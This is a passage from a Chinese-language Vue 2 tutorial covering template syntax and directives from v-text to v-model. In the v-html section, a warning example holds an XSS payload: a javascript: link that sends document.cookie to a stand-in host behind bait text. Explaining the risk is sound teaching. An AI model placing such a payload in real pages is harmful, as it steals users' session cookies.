+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--本地导入--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;本地 vue.js 文件路径&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--在线导入--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--对于制作原型或学习，你可以这样使用最新版本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.8/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--对于生产环境，官方推荐链接到一个明确的版本号和构建文件，以避免新版本造成的不可预期的破坏：--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="5-案例入门"><a href="#5-案例入门" class="headerlink" title="5. 案例入门"></a>5. 案例入门</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 关闭 Vue 生产提示</span></span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">	 <span class="comment">// 创建一个Vue对象</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 指定,该对象代表&lt;div id=&quot;root&quot;&gt;,也就是说,这个div中的所有内容,都被当前的app对象管理</span></span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 定义vue中的数据</span></span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">name</span>:<span class="string">&quot;划水艺术家&quot;</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">  	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>效果：</strong></p>
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144220.png" alt="  "></p>
+<h1 id="二、Vue基本语法"><a href="#二、Vue基本语法" class="headerlink" title="二、Vue基本语法"></a>二、Vue基本语法</h1><p>Vue模板语法包括两大类：</p>
+<p><strong>插值语法</strong>： </p>
+<ul>
+<li><strong>功能</strong>：用于解析标签体内容 </li>
+<li><strong>写法</strong>：<code>&#123;&#123;xxx&#125;&#125;</code>，xxx是js表达式，且可以直接读取到data中的所有区域</li>
+</ul>
+<hr>
+<p><strong>指令语法</strong>： </p>
+<ul>
+<li><strong>功能</strong>：用于解析标签（包括：标签属性、标签体内容、绑定事件…） </li>
+<li><strong>举例</strong>：<code>&lt;a v-bind:href=&quot;xxx&quot;&gt;</code>，xxx同样要写js表达式，且可以直接读取到data中的所有属性</li>
+<li><strong>备注</strong>：Vue中有很多的指令，且形式都是v-???，此处我们只是拿v-bind举个例子</li>
+</ul>
+<h1 id="三、内容渲染指令"><a href="#三、内容渲染指令" class="headerlink" title="三、内容渲染指令"></a>三、内容渲染指令</h1><h2 id="1-插值语法"><a href="#1-插值语法" class="headerlink" title="1. 插值语法"></a>1. 插值语法</h2><p><strong>插值表达式用户把Vue中所定义的数据,显示在页面上. 插值表达式允许用户输入”JS代码片段”</strong><br><strong>语法</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; 变量名/对象.属性名 &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>案例</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--双括号里面是表达式--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--双括号前后跟字符--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;,嘿嘿<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--双括号里面表达式加空格或者字符--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;name+ &#x27;空格或者字符&#x27; + age&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--双括号后加双括号--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;name&#125;&#125; &#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--双括号里面还能进行变量计算--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;age + 20&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">&lt;!--双括号只能写在标签内部,不能写在标签属性里面--&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- &lt;h1 &#123;&#123;name&#125;&#125;&gt; &lt;/h1&gt; 报错--&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">name</span>:<span class="string">&quot;划水艺术家&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">age</span>: <span class="number">20</span>,</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">  	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="2-v-text"><a href="#2-v-text" class="headerlink" title="2. v-text"></a>2. v-text</h2><ul>
+<li><strong>v-text 其作用和插值表达式类似。v-text 可以避免插值闪烁问题，当网速比较慢时, 使用插值语法来展示数据, 有可能会产生插值闪烁问题</strong></li>
+<li><strong>插值语法只会插入内容，不会清除其余的内容；但 v-text 会把当前元素的其他内容全部清除掉</strong><blockquote>
+<p> <strong>插值闪烁</strong>：在数据未加载完成时，页面会显示出原始的 <code>&#123;&#123;&#125;&#125;</code>, 过一会才会展示正常数据。</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>语法</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-text</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>	<span class="comment">&lt;!-- 相当于&lt;span&gt;&#123;&#123;name&#125;&#125;&lt;/span&gt; --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><strong>v-text</strong>：把数据当作纯文本显示.</li>
+</ul>
+</blockquote>
+<p><strong>案例</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--v-text 是放在标签属性中--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-text</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="3-v-html"><a href="#3-v-html" class="headerlink" title="3. v-html"></a>3. v-html</h2><p><strong>某些情况下，我们从服务器请求到的数据本身就是一个HTML代码，我们希望前端接受到数据后按照HTML格式进行解析，并且显示对应的内容，那我们就可以使用v-html指令。</strong></p>
+<p><strong>语法</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-html</span>=<span class="string">&quot;myHtml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>	</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><strong>v-html</strong>：遇到html标签,会正常解析</li>
+</ul>
+</blockquote>
+<p><strong>案例</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--v-html是放在标签属性中--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-html</span>=<span class="string">&quot;myHtml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>	</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">myHtml</span>:<span class="string">&quot;&lt;h1&gt;划水艺术家&lt;/h1&gt;&quot;</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">  	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>&#x3D;&#x3D;严重注意：v-html有安全性问题！！！&#x3D;&#x3D;</p>
+<ul>
+<li>在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击</li>
+<li>一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！！！</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">str</span>:<span class="string">&#x27;&lt;a href=javascript:location.href=&quot;http://www.xxx.com?&quot;+document.cookie&gt;兄弟我找到你想要的资源了，快来！&lt;/a&gt;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144230.png" alt="  "></p>
+<hr>
+<p><strong>当点击这个链接就进入心怀不轨之人的圈套了！！！</strong></p>
+<h2 id="4-v-once"><a href="#4-v-once" class="headerlink" title="4. v-once"></a>4. v-once</h2><p><strong>我们有时候希望展示的部分数据不会随着Vue的响应式而发生变化，就可以使用 v-once 指令。</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>会变化&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-once</span>&gt;</span>不会变化&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li>v-once指令后面不需要跟任何表达式</li>
+<li>v-once该指令表示元素和组件只渲染一次，不会随着数据的改变而改变，可以用于优化性能</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="5-v-pre"><a href="#5-v-pre" class="headerlink" title="5. v-pre"></a>5. v-pre</h2><p><strong>该指令的作用是用于跳过这个元素和它子元素的编译过程，用于显示原本的插值语法，一般我们的插值语法会去data里面找对应的变量然后解析，可是如果我们就想让其显示为  ，这个时候需要加 v-pre 属性，如下</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-pre</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144234.png" alt="  "></p>
+<blockquote>
+<ul>
+<li>v-pre跳过其所在节点的编译过程。</li>
+<li>v-pre可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会<code>加快编译</code></li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="6-v-cloak"><a href="#6-v-cloak" class="headerlink" title="6. v-cloak"></a>6. v-cloak</h2><p><strong>在实际开发中，前端数据大多是从服务器端获取来的，如果网络不好获取的比较慢，浏览器可能会直接显示出未编译的插值标签。那么页面在渲染时可能会先显示 <code>&#123;&#123;name&#125;&#125;</code> 之后变为 <code>划水艺术家</code>。这种效果不是我们想要的，我们可以给标签添加 v-cloak 来避免这种效果。（v-cloak 与 v-text 都可以解决插值闪烁问题，但 v-text 会清楚当前元素显示的其他内通内容，但 v-cloak 不会）</strong></p>
+<p><strong>v-cloak 使用流程：</strong></p>
+<ul>
+<li>加上v-clock 属性,并加上css。</li>
+<li>vue解析之前有 v-clock 属性时，让其不显示</li>
+<li>Vue解析之后没有v-clock 属性，再让其显示</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">	<span class="selector-attr">[v-cloak]</span> &#123;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-cloak</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// el:&quot;#root&quot;,</span></span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">	 			<span class="attr">name</span>:<span class="string">&quot;划水艺术家&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 在 2 秒后才实例化容器</span></span></span><br><span class="line"><span class="language-javascript">	<span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">		app.$mount(<span class="string">&quot;#root&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">	&#125;, <span class="number">2000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h1 id="四、数据绑定指令"><a href="#四、数据绑定指令" class="headerlink" title="四、数据绑定指令"></a>四、数据绑定指令</h1><p><strong>Vue中有2种数据绑定的方式：</strong></p>
+<ul>
+<li><strong>单向绑定（<code>v-bind</code>）</strong>：数据只能从data流向页面</li>
+<li><strong>双向绑定（<code>v-model</code>）</strong>：数据不仅能从data流向页面，还可以从页面流向data</li>
+</ul>
+<h2 id="1-v-bind"><a href="#1-v-bind" class="headerlink" title="1. v-bind"></a>1. v-bind</h2><p>上述指令主要作用是将值插入到我们的模板的内容当中，但是，除了内容需要动态来决定外，某些属性我们也希望动态来绑定。比如：</p>
+<ul>
+<li>动态绑定<code>&lt;a&gt;</code>的 href 属性</li>
+<li>动态绑定<code>&lt;img&gt;</code>元素的 src 属性</li>
+<li>……</li>
+</ul>
+<p><strong>使用如下</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">&quot;url&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">   <span class="attr">el</span>: <span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">url</span>: <span class="string">&#x27;http://www.baidu.com&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">   &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144239.png" alt="  "></p>
+<blockquote>
+<p><strong>可以将 <code>v-bind</code> 简写为 <code>:</code></strong></p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">&quot;url&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="2-v-model"><a href="#2-v-model" class="headerlink" title="2. v-model"></a>2. v-model</h2><p><strong>v-model可以实现：数据变化的时候, 页面会自动刷新；页面变化的时候，数据也会自动变化。</strong></p>
+<p><strong>注意：</strong></p>
+<blockquote>
+<ul>
+<li>双向绑定, 只能绑定 “文本框,单选按钮,复选框,文本域,下拉列表 ”等</li>
+<li>文本框&#x2F;单选按钮&#x2F;textarea, 绑定的数据是字符串类型</li>
+<li>单个复选框, 绑定的是boolean类型</li>
+<li>多个复选框, 绑定的是数组</li>
+<li>select单选对应字符串，多选对应是数组</li>
+</ul>
+</blockquote>
+<h3 id="1-绑定文本框"><a href="#1-绑定文本框" class="headerlink" title="1. 绑定文本框"></a>1. 绑定文本框</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;username&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">//该属性值和文本框的value属性值,保持一致</span></span></span><br><span class="line"><span class="language-javascript">			<span class="attr">username</span>:<span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h3 id="2-绑定单个复选框"><a href="#2-绑定单个复选框" class="headerlink" title="2. 绑定单个复选框"></a>2. 绑定单个复选框</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;agree&quot;</span>&gt;</span>同意<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span 